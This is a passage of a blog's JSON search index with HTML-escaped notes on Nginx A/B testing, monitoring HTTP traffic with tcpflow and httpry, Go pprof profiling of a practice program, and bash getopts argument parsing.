style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eindex\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eindex-\u003c/span\u003e${variant}.html;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","NGINX","Testing"],"title":"Nginx 使用 split_clients 进行简易 A/B 测试"},{"categories":["URL","Linux","command line","HTTP","Network"],"contents":" Monitoring HTTP Requests on a Network Interface in Real Time tcpflow apt/dnf install tcpflow\n$ sudo tcpflow -p -c -i wlp0s20f3 port 80 | grep -oE \u0026#39;(GET|POST) .* HTTP/1.[01]|Host: .*\u0026#39; reportfilename: ./report.xml tcpflow: listening on wlp0s20f3 GET /alexlarsson/flatpak/ubuntu/dists/focal/InRelease HTTP/1.1 GET /mirrors.txt HTTP/1.1 -p disables promiscuous mode -c means only print the output to the console and don\u0026rsquo;t create files -i specifies the network interface grep receives the output of tcpflow -o means show only the matching parts of the lines that match the pattern -E means the pattern is an extended regular expression (ERE) httpry https://github.com/jbittel/httpry.git\nsudo httpry -i wlp0s20f3 httpry version 0.1.8 -- HTTP logging and information retrieval tool Copyright (c) 2005-2014 Jason Bittel \u0026lt;jason.bittel@gmail.com\u0026gt; Starting capture on wlp0s20f3 interface 2022-06-22 16:38:12.166\t192.168.1.24\t172.217.17.238\t\u0026gt;\tGET\tgoogle.com\t/\tHTTP/1.1\t-\t- 2022-06-22 16:38:12.199\t172.217.17.238\t192.168.1.24\t\u0026lt;\t-\t-\t-\tHTTP/1.0\t400\tBad Request 2022-06-22 16:38:23.090\t192.168.1.24\t172.217.17.238\t\u0026gt;\tPOST\tgoogle.com\t/\tHTTP/1.1\t-\t- 2022-06-22 16:38:23.163\t172.217.17.238\t192.168.1.24\t\u0026lt;\t-\t-\t-\tHTTP/1.1\t405\tMethod Not Allowed ","date":"June 23, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220623-monitoring-http-requests-network-interfaces/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/monitoring-http-requests-network-interfaces\" target=\"_blank\" rel=\"noopener\"\u003eMonitoring HTTP Requests on a Network Interface in Real Time\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"tcpflow\"\u003etcpflow\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003eapt/dnf install tcpflow\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo tcpflow -p -c -i wlp0s20f3 port \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e | grep -oE \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;(GET|POST) .* HTTP/1.[01]|Host: .*\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ereportfilename: ./report.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etcpflow: listening on wlp0s20f3\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGET /alexlarsson/flatpak/ubuntu/dists/focal/InRelease HTTP/1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGET /mirrors.txt HTTP/1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-p\u003c/code\u003e disables promiscuous mode\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-c\u003c/code\u003e means only print the output to the console and don\u0026rsquo;t create files\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-i\u003c/code\u003e specifies the network interface\ngrep receives the output of tcpflow\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-o\u003c/code\u003e means show only the matching parts of the lines that match the pattern\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-E\u003c/code\u003e means the pattern is an extended regular expression (ERE)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"httpry\"\u003ehttpry\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003ehttps://github.com/jbittel/httpry.git\u003c/code\u003e\u003c/p\u003e","tags":["URL","Linux","command line","HTTP","Network"],"title":"Monitoring HTTP Requests on a Network Interface in Real Time"},{"categories":["URL","Go","pprof"],"contents":" golang pprof 实战 炸弹程序 package main import ( // 略 _ \u0026#34;net/http/pprof\u0026#34; // 会自动注册 handler 到 http server，方便通过 http 接口获取程序运行采样报告 // 略 ) func main() { // 略 runtime.GOMAXPROCS(1) // 限制 CPU 使用数，避免过载 runtime.SetMutexProfileFraction(1) // 开启对锁调用的跟踪 runtime.SetBlockProfileRate(1) // 开启对阻塞操作的跟踪 go func() { // 启动一个 http server，注意 pprof 相关的 handler 已经自动注册过了 // /debug/pprof/ if err := http.ListenAndServe(\u0026#34;:6060\u0026#34;, nil); err != nil { log.Fatal(err) } os.Exit(0) }() // 略 } http://localhost:6060/debug/pprof/ 类型 描述 备注 allocs 内存分配情况的采样信息 可以用浏览器打开，但可读性不高 blocks 阻塞操作情况的采样信息 可以用浏览器打开，但可读性不高 cmdline 显示程序启动命令及参数 可以用浏览器打开，这里会显示 ./go-pprof-practice goroutine 当前所有协程的堆栈信息 可以用浏览器打开，但可读性不高 heap 堆上内存使用情况的采样信息 可以用浏览器打开，但可读性不高 mutex 锁争用情况的采样信息 可以用浏览器打开，但可读性不高 profile CPU 占用情况的采样信息 浏览器打开会下载文件 threadcreate 系统线程创建情况的采样信息 可以用浏览器打开，但可读性不高 trace 程序运行跟踪信息 浏览器打开会下载文件，本文不涉及，可另行参阅《深入浅出 Go trace》 排查 CPU 占用过高\n可以看到 CPU 占用相当高，go tool pprof http://localhost:6060/debug/pprof/profile 进入一个交互式终端 输入 top 命令，查看 CPU 占用较高的调用 很明显，CPU 占用过高是 github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat 造成的。 输入 list Eat，查看问题具体在代码的哪一个位置 可以看到，是第 24 行那个一百亿次空循环占用了大量 CPU 时间 接下来有一个扩展操作：图形化显示调用栈信息，这很酷，但是需要你事先在机器上安装 graphviz，大多数系统上可以轻松安装它\nbrew install graphviz # for macos apt install graphviz # for ubuntu yum install graphviz # for centos 交互式终端里输入 web(虽然这个命令的名字叫\u0026quot;web\u0026quot;，但它的实际行为是产生一个 .svg 文件，并调用你的系统里设置的默认打开 .svg 的程序打开它) 输入 exit 退出 pprof 的交互式终端 排查内存占用过高\n内存的占用率仍然很高 go tool pprof http://localhost:6060/debug/pprof/heap 再一次使用 top, list 来定问问题代码 这次出问题的地方在 github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal 使用 web 来查看图形化展示，可以再次确认问题确实出在这里 排查频繁内存回收 GODEBUG=gctrace=1 ./go-pprof-practice | grep gc 接下来使用 pprof 排查时，我们在乎的不是什么地方在占用大量内存，而是什么地方在不停地申请内存，这两者是有区别的\ngo tool pprof http://localhost:6060/debug/pprof/allocs 可以看到 github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run 会进行无意义的内存申请 排查协程泄露 我们在浏览器里可以看到，此时程序的协程数已经多达 106 条 106 goroutine\ngo tool pprof http://localhost:6060/debug/pprof/goroutine 可能这次问题藏得比较隐晦，但仔细观察还是不难发现，问题在于 github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Drink 在不停地创建没有实际作用的协程 排查锁的争用\ngo tool pprof http://localhost:6060/debug/pprof/mutex 可以看出来这问题出在 github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Howl。但要知道，在代码中使用锁是无可非议的，并不是所有的锁都会被标记有问题，我们看看这个有问题的锁那儿触雷了。 排查阻塞操作\ngo tool pprof http://localhost:6060/debug/pprof/block 可以看到，阻塞操作位于 github.com/wolfogre/go-pprof-practice/animal/felidae/cat.(*Cat).Pee ","date":"June 22, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220622-go-ppof-practice/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.wolfogre.com/posts/go-ppof-practice/\" target=\"_blank\" rel=\"noopener\"\u003egolang pprof 实战\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wolfogre/go-pprof-practice\" target=\"_blank\" rel=\"noopener\"\u003e炸弹程序\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 略\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;net/http/pprof\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e// 会自动注册 handler 到 http server，方便通过 http 接口获取程序运行采样报告\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 略\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 略\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eruntime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGOMAXPROCS\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 限制 CPU 使用数，避免过载\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eruntime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSetMutexProfileFraction\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 开启对锁调用的跟踪\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eruntime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSetBlockProfileRate\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 开启对阻塞操作的跟踪\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#75715e\"\u003e// 启动一个 http server，注意 pprof 相关的 handler 已经自动注册过了\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// /debug/pprof/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eListenAndServe\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;:6060\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eExit\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 略\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003ehttp://localhost:6060/debug/pprof/\u003c/li\u003e\n\u003c/ul\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e类型\u003c/th\u003e\n          \u003cth\u003e描述\u003c/th\u003e\n          \u003cth\u003e备注\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eallocs\u003c/td\u003e\n          \u003ctd\u003e内存分配情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eblocks\u003c/td\u003e\n          \u003ctd\u003e阻塞操作情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ecmdline\u003c/td\u003e\n          \u003ctd\u003e显示程序启动命令及参数\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，这里会显示 ./go-pprof-practice\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003egoroutine\u003c/td\u003e\n          \u003ctd\u003e当前所有协程的堆栈信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eheap\u003c/td\u003e\n          \u003ctd\u003e堆上内存使用情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003emutex\u003c/td\u003e\n          \u003ctd\u003e锁争用情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eprofile\u003c/td\u003e\n          \u003ctd\u003eCPU 占用情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e浏览器打开会下载文件\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ethreadcreate\u003c/td\u003e\n          \u003ctd\u003e系统线程创建情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003etrace\u003c/td\u003e\n          \u003ctd\u003e程序运行跟踪信息\u003c/td\u003e\n          \u003ctd\u003e浏览器打开会下载文件，本文不涉及，可另行参阅《深入浅出 Go trace》\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003e排查 CPU 占用过高\u003c/strong\u003e\u003c/p\u003e","tags":["URL","Go","pprof"],"title":"golang pprof 实战"},{"categories":["URL","Linux","BASH"],"contents":" Parse Command Line Arguments in Bash getopts getopts optstring opt [arg ...]\n#!/bin/bash while getopts \u0026#39;abc:h\u0026#39; opt; do case \u0026#34;$opt\u0026#34; in a) echo \u0026#34;Processing option \u0026#39;a\u0026#39;\u0026#34; ;; b) echo \u0026#34;Processing option \u0026#39;b\u0026#39;\u0026#34; ;; c) arg=\u0026#34;$OPTARG\u0026#34; echo \u0026#34;Processing option \u0026#39;c\u0026#39; with \u0026#39;${OPTARG}\u0026#39; argument\u0026#34; ;; ?|h) echo \u0026#34;Usage: $(basename $0) [-a] [-b] [-c arg]\u0026#34; exit 1 ;; esac done shift \u0026#34;$(($OPTIND -1))\u0026#34; optstring represents the supported options. The option expects an argument if there is a colon (:) after it. For instance, if option c expects an argument, then it would be represented as c: in the optstring When an option has an associated argument, then getopts stores the argument as a string in the OPTARG shell variable. For instance, the argument passed to option c would be stored in the OPTARG variable. opt contains the parsed option. #!/bin/bash while getopts \u0026#39;:abc:h\u0026#39; opt; do case \u0026#34;$opt\u0026#34; in a) echo \u0026#34;Processing option \u0026#39;a\u0026#39;\u0026#34; ;; b) echo \u0026#34;Processing option \u0026#39;b\u0026#39;\u0026#34; ;; c) arg=\u0026#34;$OPTARG\u0026#34; echo \u0026#34;Processing option \u0026#39;c\u0026#39; with \u0026#39;${OPTARG}\u0026#39; argument\u0026#34; ;; h) echo \u0026#34;Usage: $(basename $0) [-a] [-b] [-c arg]\u0026#34; exit 0 ;; :) echo -e \u0026#34;option requires an argument.\\nUsage: $(basename $0) [-a] [-b] [-c arg]\u0026#34; exit 1 ;; ?) echo -e \u0026#34;Invalid command option.\\nUsage: $(basename $0) [-a] [-b] [-c arg]\u0026#34; exit 1 ;; esac done shift \u0026#34;$(($OPTIND -1))\u0026#34; Note that we\u0026rsquo;ve updated optstring as well. Now it starts with the colon(:) character, which suppresses the default error message. The getopts function disables error reporting when the OPTERR variable is set to zero. Parsing Long Command-Line Options With getopt #!/bin/bash VALID_ARGS=$(getopt -o abg:d: --long alpha,beta,gamma:,delta: -- \u0026#34;$@\u0026#34;) if [[ $? -ne 0 ]]; then exit 1; fi eval set -- \u0026#34;$VALID_ARGS\u0026#34; while [ : ]; do case \u0026#34;$1\u0026#34; in -a | --alpha) echo \u0026#34;Processing \u0026#39;alpha\u0026#39; option\u0026#34; shift ;; -b | --beta) echo \u0026#34;Processing \u0026#39;beta\u0026#39; option\u0026#34; shift ;; -g | --gamma) echo \u0026#34;Processing \u0026#39;gamma\u0026#39; option. Input argument is \u0026#39;$2\u0026#39;\u0026#34; shift 2 ;; -d | --delta) echo \u0026#34;Processing \u0026#39;delta\u0026#39; option. Input argument is \u0026#39;$2\u0026#39;\u0026#34; shift 2 ;; --) shift; break ;; esac done -o option represents the short command-line options --long option represents the long command-line options ","date":"June 7, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220607-bash-parse-command-line-arguments/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/bash-parse-command-line-arguments\" target=\"_blank\" rel=\"noopener\"\u003eParse Command Line Arguments in Bash\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"getopts\"\u003egetopts\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003egetopts optstring opt [arg ...]\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e getopts \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;abc:h\u0026#39;\u003c/span\u003e opt; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$opt\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e in\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    a\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;a\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    b\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;b\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    c\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      arg\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$OPTARG\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;c\u0026#39; with \u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eOPTARG\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39; argument\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ?|h\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Usage: \u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ebasename $0\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e [-a] [-b] [-c arg]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      exit \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eesac\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshift \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$((\u003c/span\u003e$OPTIND \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e))\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eoptstring represents the supported options. The option expects an argument if there is a colon (:) after it. For instance, if option c expects an argument, then it would be represented as c: in the optstring\u003c/li\u003e\n\u003cli\u003eWhen an option has an associated argument, then getopts stores the argument as a string in the OPTARG shell variable. For instance, the argument passed to option c would be stored in the OPTARG variable.\u003c/li\u003e\n\u003cli\u003eopt contains the parsed option.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e getopts \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;:abc:h\u0026#39;\u003c/span\u003e opt; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$opt\u003cspan 